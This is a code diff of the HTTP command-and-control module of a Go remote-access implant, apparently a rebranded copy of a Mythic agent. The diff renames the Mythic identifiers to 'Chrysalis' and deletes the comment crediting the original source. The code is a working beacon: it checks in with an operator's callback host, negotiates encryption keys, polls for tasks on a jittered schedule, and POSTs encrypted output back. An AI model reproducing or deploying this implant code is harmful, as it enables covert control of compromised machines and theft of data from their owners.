@@ -27,9 +27,6 @@ import (
 	"github.com/FractalKnight/chrysalis/pkg/utils/structs"
 )
 
-// HTTP C2 profile variables from https://github.com/MythicC2Profiles/http/blob/master/C2_Profiles/http/mythic/c2_functions/HTTP.py
-// All variables must be a string so they can be set with ldflags
-
 // callback_host is the callback host
 var callback_host string
 
@@ -63,7 +60,7 @@ var proxy_user string
 var proxy_pass string
 var proxy_bypass string
 
-type C2Default struct {
+type Default struct {
 	BaseURL        string
 	PostURI        string
 	ProxyURL       string
@@ -79,7 +76,6 @@ type C2Default struct {
 	Killdate       time.Time
 }
 
-// New creates a new HTTP C2 profile from the package's global variables and returns it
 func New() structs.Profile {
 	var final_url string
 	var last_slash int
@@ -109,7 +105,7 @@ func New() structs.Profile {
 	if err != nil {
 		os.Exit(1)
 	}
-	profile := C2Default{
+	profile := Default{
 		BaseURL:   final_url,
 		PostURI:   post_uri,
 		ProxyUser: proxy_user,
@@ -157,29 +153,29 @@ func New() structs.Profile {
 	return &profile
 }
 
-func (c *C2Default) Start() {
-	// Checkin with Mythic via an egress channel
+func (c *Default) Start() {
+	// Checkin with Chrysalis via an egress channel
 	resp := c.CheckIn()
 	checkIn := resp.(structs.CheckInMessageResponse)
 	// If we successfully checkin, get our new ID and start looping
 	if strings.Contains(checkIn.Status, "success") {
-		SetMythicID(checkIn.ID)
+		SetChrysalisID(checkIn.ID)
 		for {
 			// loop through all task responses
-			message := CreateMythicMessage()
+			message := CreateChrysalisMessage()
 			encResponse, _ := json.Marshal(message)
-			//fmt.Printf("Sending to Mythic: %v\n", string(encResponse))
+			//fmt.Printf("Sending to Chrysalis: %v\n", string(encResponse))
 			resp := c.SendMessage(encResponse).([]byte)
 			if len(resp) > 0 {
 				//fmt.Printf("Raw resp: \n %s\n", string(resp))
-				taskResp := structs.MythicMessageResponse{}
+				taskResp := structs.ChrysalisMessageResponse{}
 				err := json.Unmarshal(resp, &taskResp)
 				if err != nil {
 					log.Printf("Error unmarshal response to task response: %s", err.Error())
 					time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 					continue
 				}
-				HandleInboundMythicMessageFromEgressP2PChannel <- taskResp
+				HandleInboundChrysalisMessageFromEgressP2PChannel <- taskResp
 			}
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 		}
@@ -188,7 +184,7 @@ func (c *C2Default) Start() {
 	}
 }
 
-func (c *C2Default) GetSleepTime() int {
+func (c *Default) GetSleepTime() int {
 	if c.Jitter > 0 {
 		jit := float64(rand.Int()%c.Jitter) / float64(100)
 		jitDiff := float64(c.Interval) * jit
@@ -202,7 +198,7 @@ func (c *C2Default) GetSleepTime() int {
 	}
 }
 
-func (c *C2Default) SetSleepInterval(interval int) string {
+func (c *Default) SetSleepInterval(interval int) string {
 	if interval >= 0 {
 		c.Interval = interval
 		return fmt.Sprintf("Sleep interval updated to %ds\n", interval)
@@ -212,7 +208,7 @@ func (c *C2Default) SetSleepInterval(interval int) string {
 
 }
 
-func (c *C2Default) SetSleepJitter(jitter int) string {
+func (c *Default) SetSleepJitter(jitter int) string {
 	if jitter >= 0 && jitter <= 100 {
 		c.Jitter = jitter
 		return fmt.Sprintf("Jitter updated to %d%% \n", jitter)
@@ -221,12 +217,12 @@ func (c *C2Default) SetSleepJitter(jitter int) string {
 	}
 }
 
-func (c *C2Default) ProfileType() string {
+func (c *Default) ProfileType() string {
 	return "http"
 }
 
 // CheckIn a new agent
-func (c *C2Default) CheckIn() interface{} {
+func (c *Default) CheckIn() interface{} {
 
 	// Start Encrypted Key Exchange (EKE)
 	if c.ExchangingKeys {
@@ -242,7 +238,7 @@ func (c *C2Default) CheckIn() interface{} {
 		}
 		resp := c.SendMessage(raw).([]byte)
 
-		// save the Mythic id
+		// save the Chrysalis id
 		response := structs.CheckInMessageResponse{}
 		err = json.Unmarshal(resp, &response)
 
@@ -253,7 +249,7 @@ func (c *C2Default) CheckIn() interface{} {
 
 		if len(response.ID) != 0 {
 			//log.Printf("Saving new UUID: %s\n", response.ID)
-			SetMythicID(response.ID)
+			SetChrysalisID(response.ID)
 		} else {
 			continue
 		}
@@ -263,7 +259,7 @@ func (c *C2Default) CheckIn() interface{} {
 }
 
 // NegotiateKey - EKE key negotiation
-func (c *C2Default) NegotiateKey() bool {
+func (c *Default) NegotiateKey() bool {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
 	c.RsaPrivateKey = priv
@@ -297,7 +293,7 @@ func (c *C2Default) NegotiateKey() bool {
 	c.ExchangingKeys = false
 
 	if len(sessionKeyResp.UUID) > 0 {
-		SetMythicID(sessionKeyResp.UUID) // Save the new, temporary UUID
+		SetChrysalisID(sessionKeyResp.UUID) // Save the new, temporary UUID
 	} else {
 		return false
 	}
@@ -306,14 +302,14 @@ func (c *C2Default) NegotiateKey() bool {
 }
 
 // PostResponse - Post task responses
-func (c *C2Default) SendMessage(output []byte) interface{} {
+func (c *Default) SendMessage(output []byte) interface{} {
 	endpoint := c.PostURI
 	return c.htmlPostData(endpoint, output)
 
 }
 
 // htmlPostData HTTP POST function
-func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
+func (c *Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	targeturl := fmt.Sprintf("%s%s", c.BaseURL, c.PostURI)
 	//log.Println("Sending POST request to url: ", url)
 	// If the AesPSK is set, encrypt the data we send
@@ -321,8 +317,8 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 		//log.Printf("Encrypting Post data")
 		sendData = c.encryptMessage(sendData)
 	}
-	if GetMythicID() != "" {
-		sendData = append([]byte(GetMythicID()), sendData...) // Prepend the UUID
+	if GetChrysalisID() != "" {
+		sendData = append([]byte(GetChrysalisID()), sendData...) // Prepend the UUID
 	} else {
 		sendData = append([]byte(UUID), sendData...) // Prepend the UUID
 	}
@@ -427,12 +423,12 @@ func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
 	return make([]byte, 0) //shouldn't get here
 }
 
-func (c *C2Default) encryptMessage(msg []byte) []byte {
+func (c *Default) encryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesEncrypt(key, msg)
 }
 
-func (c *C2Default) decryptMessage(msg []byte) []byte {
+func (c *Default) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
 	return crypto.AesDecrypt(key, msg)
 }
